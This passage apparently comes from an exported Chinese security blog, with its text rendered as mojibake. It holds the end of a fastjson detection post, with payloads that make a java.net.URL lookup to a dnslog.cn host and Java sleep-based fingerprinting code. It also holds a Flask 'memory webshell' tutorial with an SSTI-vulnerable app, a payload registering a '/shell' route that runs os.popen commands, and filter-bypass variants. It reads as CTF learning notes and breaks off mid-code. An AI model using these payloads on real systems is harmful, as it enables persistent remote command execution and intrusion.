class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaa&quot;</span><span class="hljs-punctuation">&#125;</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯èƒ½æœ‰æ—¶å€™æ¢æµ‹å‡ºç°é—®é¢˜ï¼Œè¯´type not matchï¼Œå…¶å®åŸå› æ˜¯ï¼Œæœ‰çš„å¼€å‘åœ¨ä½¿ç”¨fastjsonè§£æè¯·æ±‚æ—¶ä¼šä½¿ç”¨Springçš„@RequestBodyæ³¨é‡Šï¼Œå‘Šè¯‰è§£æå¼•æ“ï¼Œæˆ‘éœ€è¦çš„æ˜¯ä¸€ä¸ªUserç±»å¯¹è±¡</p><p>æœ€å¤–å±‚ä¸€å®šæ˜¯æ•°ç»„æˆ–è€…å¯¹è±¡ï¼Œä¸è¦åŠ @typeï¼Œç„¶åå°†Payloadä½œä¸ºå…¶ä¸­ä¸€ä¸ªé”®å€¼ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-string">&quot;xxx&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·å†™é€šå¸¸å°±ä¸ä¼šæœ‰type not matchçš„</p><p><code>ä¸‹é¢çš„æ¢æµ‹æ˜¯å­˜åœ¨fastjsonå¹¶ä¸”å¯ä»¥åŠ è½½å­—èŠ‚ç çš„æƒ…å†µï¼Œçº¯ç²¹è®°å½•æ²¡æœ‰å°è¯•è¿‡</code></p><h2 id="æ“ä½œç³»ç»Ÿæ¢æµ‹"><a href="#æ“ä½œç³»ç»Ÿæ¢æµ‹" class="headerlink" title="æ“ä½œç³»ç»Ÿæ¢æµ‹"></a>æ“ä½œç³»ç»Ÿæ¢æµ‹</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">osName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();<br>        System.out.println(osName);<br>        <span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;nix&quot;</span>) || osName.contains(<span class="hljs-string">&quot;nux&quot;</span>) || osName.contains(<span class="hljs-string">&quot;mac&quot;</span>))<br>        &#123;<br>            Thread.sleep(<span class="hljs-number">3000</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>            Thread.sleep(<span class="hljs-number">6000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            Thread.sleep(<span class="hljs-number">9000</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><h2 id="ä¸­é—´ä»¶æ¢æµ‹"><a href="#ä¸­é—´ä»¶æ¢æµ‹" class="headerlink" title="ä¸­é—´ä»¶æ¢æµ‹"></a>ä¸­é—´ä»¶æ¢æµ‹</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">stackTraces</span> <span class="hljs-operator">=</span> Thread.getAllStackTraces();<br>        <span class="hljs-keyword">for</span> (Map.Entry entry : stackTraces.entrySet()) &#123;<br>            StackTraceElement[] stackTraceElements = entry.getValue();<br>            <span class="hljs-keyword">for</span> (StackTraceElement element : stackTraceElements) &#123;<br><span class="hljs-comment">// element.getClassName().contains(&quot;org.springframework.web&quot;</span><br>                <span class="hljs-keyword">if</span> (element.getClassName().contains(<span class="hljs-string">&quot;org.apache.catalina.core&quot;</span>)) &#123;<br>                    Thread.sleep(<span class="hljs-number">5000</span>);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h2 id="æ¢æµ‹jdkç‰ˆæœ¬"><a href="#æ¢æµ‹JDKç‰ˆæœ¬" class="headerlink" title="æ¢æµ‹JDKç‰ˆæœ¬"></a>æ¢æµ‹JDKç‰ˆæœ¬</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·å– Java ç‰ˆæœ¬</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">javaVersion</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>);<br><span class="hljs-comment">// è§£æä¸»ç‰ˆæœ¬å·</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">majorVersion</span> <span class="hljs-operator">=</span> Integer.parseInt(javaVersion.split(<span class="hljs-string">&quot;\\.&quot;</span>)[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">// è¿›â¾ç‰ˆæœ¬åˆ¤æ–­</span><br>        <span class="hljs-keyword">switch</span> (majorVersion) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                Thread.sleep(<span class="hljs-number">2000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>                Thread.sleep(<span class="hljs-number">3000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>                Thread.sleep(<span class="hljs-number">4000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                Thread.sleep(<span class="hljs-number">5000</span>);<br>                <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> javaæ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flaskå†…å­˜é©¬å­¦ä¹ </title>
      <link href="/2024/08/17/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/08/17/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æ‹–äº†å¾ˆä¹…ç»ˆäºæ¥çœ‹ä¸€ä¸‹flaskå†…å­˜é©¬è¿™ä¸ªä¸œè¥¿äº†ï¼Œä¸»è¦æ˜¯å‘ç°æŸæ–°ç”Ÿèµ›week2å°±è¦æ‰“flaskå†…å­˜é©¬ï¼Œèµ¶ç´§æ¥å­¦äº†ğŸ˜¢</p><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>å†…å­˜é©¬å°±æ˜¯æ— æ–‡ä»¶webshellï¼Œè¿™ä¸ªä¸å¤šè¯´äº†ï¼Œpythonçš„å†…å­˜é©¬å°±æ˜¯åœ¨ç½‘ç«™è¿è¡Œçš„æ—¶å€™åŠ¨æ€æ³¨å†Œä¸€ä¸ªè·¯ç”±ç”¨äºä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p><p>pythonçš„å†…å­˜é©¬é€šå¸¸ä¼šé…åˆsstiæˆ–è€…pickleååºåˆ—åŒ–ç­‰æ‰‹æ®µæ¥ä½¿ç”¨ï¼Œä¸»è¦æ˜¯ä¸ºäº†è§£å†³ä¸å‡ºç½‘çš„æƒ…å†µã€‚</p><h1 id="ä½ç‰ˆæœ¬å†…å­˜é©¬"><a href="#ä½ç‰ˆæœ¬å†…å­˜é©¬" class="headerlink" title="ä½ç‰ˆæœ¬å†…å­˜é©¬"></a>ä½ç‰ˆæœ¬å†…å­˜é©¬</h1><p>å…ˆç®€å•å†™ä¸€ä¸ªsstiæ¼æ´çš„flaskæœåŠ¡</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string<br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    person=<span class="hljs-string">&quot;guest&quot;</span><br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>):<br>        person=request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;</span> % person<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h2 id="å†…å­˜é©¬æ•ˆæœ"><a href="#å†…å­˜é©¬æ•ˆæœ" class="headerlink" title="å†…å­˜é©¬æ•ˆæœ"></a>å†…å­˜é©¬æ•ˆæœ</h2><p>è¿™æ˜¯ä¸€ä¸ªåŸºç¡€çš„å†…å­˜é©¬payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å»å‘nameä¼ é€’è¿™ä¸ªå‚æ•°çœ‹çœ‹æ•ˆæœ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1:8000/?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è‰¹è¿™é‡Œæœ‰ä¸ªå‘ï¼Œä¸èƒ½å¼€debugæ¨¡å¼ï¼Œå¼€äº†debugæ¨¡å¼ä¼šæŠ¥ä¸‹é¢çš„é”™è¯¯ï¼Œåˆå®³å¾—æˆ‘æ£€æŸ¥äº†å¥½ä¸€ä¼špayload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">AssertionError: A setup function was called after the first request was handled. This usually indicates a bug in the application where a module was not imported and decorators or other functionality was called too late.<br>To fix this make sure to import all your view modules, database models, and everything related at a central place before the application starts serving requests.<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªæ–­è¨€é”™è¯¯ï¼Œç™¾åº¦ç¿»è¯‘ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">AssertionErrorï¼šåœ¨å¤„ç†ç¬¬ä¸€ä¸ªè¯·æ±‚åè°ƒç”¨äº†è®¾ç½®å‡½æ•°ã€‚è¿™é€šå¸¸è¡¨ç¤ºåº”ç”¨ç¨‹åºä¸­å­˜åœ¨é”™è¯¯ï¼Œå…¶ä¸­æ¨¡å—æœªå¯¼å…¥ï¼Œè£…é¥°å™¨æˆ–å…¶ä»–åŠŸèƒ½è°ƒç”¨è¿‡æ™šã€‚<br>è¦è§£å†³æ­¤é—®é¢˜ï¼Œè¯·ç¡®ä¿åœ¨åº”ç”¨ç¨‹åºå¼€å§‹å¤„ç†è¯·æ±‚ä¹‹å‰ï¼Œå°†æ‰€æœ‰è§†å›¾æ¨¡å—ã€æ•°æ®åº“æ¨¡å‹å’Œæ‰€æœ‰ç›¸å…³å†…å®¹å¯¼å…¥åˆ°ä¸€ä¸ªä¸­å¿ƒä½ç½®ã€‚<br></code></pre></td></tr></table></figure></blockquote><p><img src="https://cdn.clown2024.cn/202410161514511.png" alt="image-20241016151406420"></p><p>è¿™é‡Œå°±æ‰“è¿›å»äº†ï¼Œæˆ‘ä»¬å†å»è®¿é—®ä¸€ä¸‹&#x2F;shellè·¯ç”±cmdä¼ å‚å³å¯</p><p><img src="https://cdn.clown2024.cn/202410161514393.png" alt="image-20241016151454348"></p><h2 id="payloadåˆ†æ"><a href="#payloadåˆ†æ" class="headerlink" title="payloadåˆ†æ"></a>payloadåˆ†æ</h2><p>ç°åœ¨æˆ‘ä»¬å°±æ¥åˆ†æä¸€ä¸‹payloadï¼ŒæŠŠä»–æ‹†æˆè¿™æ ·æ¸…æ™°ä¸€ç‚¹</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json">url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;__builtins__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;eval&#x27;<span class="hljs-punctuation">]</span>(<br><span class="hljs-string">&quot;app.add_url_rule(</span><br><span class="hljs-string">&#x27;/shell&#x27;, </span><br><span class="hljs-string">&#x27;shell&#x27;, </span><br><span class="hljs-string">lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br><span class="hljs-string">)</span><br><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#123;</span><br>&#x27;_request_ctx_stack&#x27;<span class="hljs-punctuation">:</span>url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;_request_ctx_stack&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>&#x27;app&#x27;<span class="hljs-punctuation">:</span>url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;current_app&#x27;<span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br>)<br></code></pre></td></tr></table></figure><p>é¦–å…ˆurl_for.__globals__[â€˜__builtins__â€˜][â€˜evalâ€™]è¿™å°±æ˜¯ä¸€ä¸ªsstiè·å–evalå‡½æ•°çš„payloadï¼Œurl_foræ˜¯Flaskçš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œå…¶å‘½åç©ºé—´åŒ…å«å¾ˆå¤šä¸œè¥¿ï¼ŒåŒ…æ‹¬æˆ‘ä»¬å¾…ä¼šéœ€è¦æ‹¿çš„å½“å‰åº”ç”¨çš„ä¸Šä¸‹æ–‡</p><p><strong>app.add_url_rule</strong>ï¼Œè¿™æ˜¯è°ƒç”¨appçš„ä¸€ä¸ªadd_url_ruleçš„æ·»åŠ è·¯ç”±çš„å‡½æ•°ï¼Œæ˜¯å±äºFlaskç±»é‡Œé¢çš„ä¸€ä¸ªæˆå‘˜æ–¹æ³•ï¼Œå†™ä»£ç çš„æ—¶å€™ä¸€èˆ¬æ˜¯ä½¿ç”¨@app.routeè£…é¥°å™¨æ¥å®ç°çš„ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹æºç </p><p><img src="https://cdn.clown2024.cn/202410161650862.png" alt="image-20241016165044813"></p><p>ä»–è°ƒç”¨çš„å°±æ˜¯add_url_ruleï¼Œæˆ‘ä»¬å†å»çœ‹ä¸€ä¸‹add_url_ruleçš„æºç </p><p><img src="https://cdn.clown2024.cn/202410161652015.png" alt="image-20241016165251968"></p><p>å‚æ•°è¯´æ˜ï¼Œç›´æ¥é—®ä¸€æ‰‹gptï¼Œæ„Ÿè§‰è¯´çš„æŒºæ¸…æ¥šçš„</p><ol><li><strong><code>self</code></strong>:<ul><li>è¡¨ç¤ºå½“å‰ç±»çš„å®ä¾‹ï¼Œé€šå¸¸æ˜¯ Flask åº”ç”¨æˆ–è“å›¾çš„å®ä¾‹ã€‚</li></ul></li><li><strong><code>rule: str</code></strong>:<ul><li>URL è§„åˆ™çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œ<code>&#39;/hello&#39;</code> æˆ– <code>&#39;/users/&lt;int:id&gt;&#39;</code>ã€‚è¿™æ˜¯ç”¨æˆ·è®¿é—®æ—¶éœ€è¦åŒ¹é…çš„è·¯å¾„ã€‚</li></ul></li><li><strong><code>endpoint: t.Optional[str] = None</code></strong>:<ul><li>è§†å›¾å‡½æ•°çš„ç«¯ç‚¹åç§°ã€‚ç«¯ç‚¹æ˜¯ Flask ç”¨äºæ ‡è¯†è§†å›¾å‡½æ•°çš„å”¯ä¸€åç§°ã€‚å¦‚æœæœªæä¾›ï¼Œåˆ™ä¼šä» <code>view_func</code> è‡ªåŠ¨ç”Ÿæˆã€‚</li></ul></li><li><strong><code>view_func: t.Optional[t.Callable] = None</code></strong>:<ul><li>å¤„ç†è¯·æ±‚çš„è§†å›¾å‡½æ•°ã€‚å¦‚æœæä¾›äº†è¿™ä¸ªå‚æ•°ï¼ŒFlask ä¼šå°†å…¶ä¸ URL è§„åˆ™å…³è”ã€‚</li></ul></li><li><strong><code>provide_automatic_options: t.Optional[bool] = None</code></strong>:<ul><li>æŒ‡ç¤ºæ˜¯å¦è‡ªåŠ¨å¤„ç† OPTIONS è¯·æ±‚ã€‚å¦‚æœæœªæä¾›ï¼ŒFlask ä¼šæ ¹æ®è§†å›¾å‡½æ•°çš„å±æ€§å†³å®šã€‚</li></ul></li><li><strong><code>\**options: t.Any</code></strong>:<ul><li>å…¶ä»–å¯é€‰çš„å…³é”®å­—å‚æ•°ï¼Œå¯ä»¥ç”¨äºé…ç½® URL è§„åˆ™çš„è¡Œä¸ºï¼Œæ¯”å¦‚ <code>defaults</code>ã€<code>strict_slashes</code> ç­‰ã€‚</li></ul></li></ol><p>æ‰€ä»¥payloadçš„add_url_ruleçš„è¿™éƒ¨åˆ†å°±æ˜¯æ·»åŠ ä¸€ä¸ªè·¯ç”±ï¼Œç„¶åå¤„ç†å‡½æ•°æ˜¯ç”¨lambdaå…³é”®å­—å®šä¹‰çš„åŒ¿åå‡½æ•°</p><p><strong>app</strong>ï¼ševalçš„ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯ç”¨å­—å…¸çš„å½¢å¼å®šä¹‰ä¸€äº›å…¨å±€å˜é‡ç»™ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿå°±æ˜¯æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ç”¨ï¼Œè¿™é‡Œçš„appå°±æ˜¯ç”¨url_forè·å–çš„åº”ç”¨çš„å½“å‰ä¸Šä¸‹æ–‡appï¼Œå±æ€§ä¸º<strong>current_app</strong>ï¼›</p><p><strong>_request_ctx_stack</strong>ï¼š<code>_request_ctx_stack</code>æ˜¯Flaskçš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæ˜¯ä¸€ä¸ªLocalStackå®ä¾‹</p><p>ä¸ºä»€ä¹ˆè¦è·å–è¿™ä¸ªå˜é‡å‘¢ï¼Œè¿™å’ŒFlaskçš„è¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶æœ‰å…³ï¼š</p><blockquote><p>å½“ä¸€ä¸ªè¯·æ±‚è¿›å…¥Flaskï¼Œé¦–å…ˆä¼šå®ä¾‹åŒ–ä¸€ä¸ªRequest Contextï¼Œè¿™ä¸ªä¸Šä¸‹æ–‡å°è£…äº†è¯·æ±‚çš„ä¿¡æ¯åœ¨Requestä¸­ï¼Œå¹¶å°†è¿™ä¸ªä¸Šä¸‹æ–‡æ¨å…¥åˆ°ä¸€ä¸ªåä¸º<code>_request_ctx_stack</code> çš„æ ˆç»“æ„ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´è·å–å½“å‰çš„è¯·æ±‚ä¸Šä¸‹æ–‡ç­‰åŒäºè·å–<code>_request_ctx_stack</code>çš„æ ˆé¡¶å…ƒç´ <code>_request_ctx_stack.top</code> ã€‚</p></blockquote><p>ç®€å•æ¥è®²ï¼Œå°±æ˜¯å½“ä¸€ä¸ªè¯·æ±‚è¿‡æ¥çš„æ—¶å€™ï¼Œä¼šå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡æ¥å°è£…å’Œè¿™ä¸ªè¯·æ±‚æœ‰å…³çš„ä¸œè¥¿ï¼Œç„¶åå†æ¨åˆ°æ ˆä¸­ï¼Œæˆ‘ä»¬å¯ä»¥sstiå»çœ‹ä¸€ä¸‹æ¥éªŒè¯</p><p>é¦–å…ˆæ˜¯<strong>url_for.__globals__[â€˜_request_ctx_stackâ€™].top</strong></p><p><img src="https://cdn.clown2024.cn/202410161712177.png" alt="image-20241016171228118"></p><p>å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯ä¸€ä¸ªRequestContext å¯¹è±¡</p><p>å†çœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆå±æ€§ï¼Œ<strong>url_for.__globals__[â€˜<em>request_ctx_stackâ€™].top.__dict</em>_</strong></p><p><img src="https://cdn.clown2024.cn/202410161714469.png" alt="image-20241016171427411"></p><p>å¯ä»¥çœ‹åˆ°requestå¯¹è±¡åœ¨é‡Œé¢ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„è·å–è¯·æ±‚ä¸­çš„getå’Œpostä¼ å‚çš„é‚£ä¸ªrequestï¼Œæ‰€ä»¥pyaloadä¸­ä¸ºä»€ä¹ˆè·å–è¿™ä¸ªrequestä¹Ÿå¾ˆæ¸…æ™°äº†</p><h2 id="ç»•è¿‡å˜å½¢"><a href="#ç»•è¿‡å˜å½¢" class="headerlink" title="ç»•è¿‡å˜å½¢"></a>ç»•è¿‡å˜å½¢</h2><p>å…¶å®ä¹Ÿå°±æ˜¯ä¸€äº›sstiçš„ç»•è¿‡ï¼Œå°±è®°å½•ä¸€ä¸‹url_forçš„æ›¿æ¢</p><ul><li><code>url_for</code>å¯ç”¨<code>get_flashed_messages</code>æˆ–<code>request.application.__self__._get_data_for_json</code>ç­‰æ›¿æ¢ï¼›</li></ul><p>get_flashed_messages.__globals__[â€˜_request_ctx_stackâ€™].top.__dict__</p><p><img src="https://cdn.clown2024.cn/202410161723665.png" alt="image-20241016172323613"></p><p>get_flashed_messages.__globals__</p><p>è¿™ä¸ªæœ‰å¾…è€ƒç©¶ï¼Œæˆ‘æ˜¯æ‰¾ä¸åˆ°ä»–çš„globalså±æ€§çš„ï¼Œä¼šç›´æ¥500ï¼Œæˆ‘çœ‹æ–‡ç« ä»–ä»¬å¤§æ¦‚æ˜¯è¿™ä¹ˆç”¨çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">request.application.__self__._get_data_for_json.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).__getitem__(&#x27;__bui&#x27;+&#x27;ltins__&#x27;).__getitem__(&#x27;ex&#x27;+&#x27;ec&#x27;)<br></code></pre></td></tr></table></figure><p>ç”¨è¿™ä¸ªæ¥æ‹¿evalï¼Œç”¨ä¸Šé¢é‚£ä¸ªæ¥æ‹¿requestå’Œapp</p><p><strong>appçš„å¦å¤–è·å–</strong></p><p>æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡sys.modules[â€˜__main__â€˜].appè¿™ç§æ–¹å¼æ¥è·å–app</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].app&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><del>è‡³äº_request_ctx_stackæ€ä¹ˆæ‹¿ï¼Œè¿™æˆ‘æ²¡æ¢ç´¢å‡ºæ¥ï¼Œå¤ªèœäº†ğŸ˜¢</del></p><p>æ¬¸åæ¥æˆ‘åœ¨çœ‹å¤©å·¥å®éªŒå®¤é‚£ç¯‡æ–‡ç« å‘ç°æ€ä¹ˆæ‹¿äº†ï¼Œæ‹¿çš„ä¹Ÿæ˜¯RequestContextå¯¹è±¡ï¼Œä¸€èµ·å†™åœ¨åé¢çš„æ€»ç»“</p><h1 id="æ–°ç‰ˆå†…å­˜é©¬"><a href="#æ–°ç‰ˆå†…å­˜é©¬" class="headerlink" title="æ–°ç‰ˆå†…å­˜é©¬"></a>æ–°ç‰ˆå†…å­˜é©¬</h1><p>æˆ‘ä»¬æ›´æ–°ä¸€ä¸‹flaskï¼Œå†ç”¨ä½ç‰ˆæœ¬çš„payloadæ¥æ‰“ä¸€ä¸‹ï¼Œä¼šå‘ç°è¿™æ ·çš„æŠ¥é”™</p><p><img src="https://cdn.clown2024.cn/202410170055959.png" alt="image-20241017005507732"></p><p>ç„¶åå»çœ‹ä¸€ä¸‹å‡ºç°æŠ¥é”™çš„å‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202410170056971.png" alt="image-20241017005630921"></p><p>æ˜¯å› ä¸ºæˆ‘ä»¬çš„å‡½æ•°è¢«checkäº†ï¼Œä½ç‰ˆæœ¬æˆ‘å¼€äº†debugä¼šæŠ¥é”™ä¹Ÿæ˜¯å› ä¸ºè¿™ä¸ª</p><p>é‚£å°±ä»å…¶ä»–åœ°æ–¹å…¥æ‰‹ï¼Œç±»ä¼¼javaçš„filterå†…å­˜é©¬é‚£ç§å½¢å¼ï¼Œå³åœ¨è¯·æ±‚å‰æˆ–è€…åæ‰§è¡Œæ¶æ„æ“ä½œï¼Œpythonå°±æ˜¯æ‰¾çš„é’©å­å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¹³æ—¶ç”¨çš„è£…é¥°å™¨å†…è°ƒç”¨çš„å‡½æ•°</p><blockquote><p>å…¶å®add_url_ruleè¿˜æ˜¯å¯ä»¥ç”¨ï¼Œåé¢å†è¯´</p></blockquote><h2 id="appbefore_request"><a href="#app-before-request" class="headerlink" title="@app.before_request"></a>@app.before_request</h2><p>ä»åå­—å°±èƒ½çŸ¥é“ï¼Œä»–çš„æ„æ€å°±æ˜¯åœ¨æˆ‘ä»¬çš„è¯·æ±‚å‰è¿›è¡Œä¸€äº›æ“ä½œ</p><p>ä»–çš„æ­£å¸¸å†™æ³•</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.before_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">before_request</span>():<br>    <span class="hljs-comment"># æ‰§è¡Œæ“ä½œæ¯”å¦‚èº«ä»½éªŒè¯</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request.headers.get(<span class="hljs-string">&quot;Authorization&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unauthorized&quot;</span>,<span 